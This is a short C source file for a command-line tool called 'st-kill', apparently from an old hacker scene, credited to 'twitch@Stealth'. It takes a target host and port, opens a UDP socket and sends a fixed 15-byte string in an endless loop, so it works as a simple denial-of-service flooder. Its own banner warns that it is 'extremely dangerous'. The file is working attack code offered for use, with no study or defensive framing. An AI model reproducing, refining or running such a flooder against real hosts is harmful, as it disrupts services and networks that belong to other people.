#define BOMB_STRING "0123456789ABCDE"
#define BOMB_SIZE 15

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

int echo_connect(char *, short);

int echo_connect(char *server, short port)
{
   struct sockaddr_in sin;
   struct hostent *hp;
   int thesock;

   printf("\n");
   printf("[1mStealth[0m> %s [1;30m:[0m port %d\n", server, port);
   hp = gethostbyname(server);
   if (hp==NULL) {
printf("[1mStealth[0m> Non[1;30m-[0mexistant host[1;30m:[0m %s\n",server);
printf("\n");
exit(0);
   }
   bzero((char*) &sin, sizeof(sin));
   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
   sin.sin_family = hp->h_addrtype;
   sin.sin_port = htons(port);
   thesock = socket(AF_INET, SOCK_DGRAM, 0);
   connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
   return thesock;
}


main(int argc, char **argv)
{
   int s;
   if(argc != 3)
   {
printf("\n");
printf("[1;30mtw[0mit[1mch@St[0meal[1;30mth[33m:[0m\n");
printf("\n");
printf("[1;5;31mThis tool is extremely dangerous. Use at your own risk![0m\n");
printf("\n");
printf("[1;30mUsage:[0m st[1m-[0mkill <[1mhost[0m> <[1mport[0m>\n");
printf("\n");
exit(0);
   }
   s=echo_connect(argv[1], atoi(argv[2]));
   for(;;)
   {
send(s, BOMB_STRING, BOMB_SIZE, 0);
   }
}



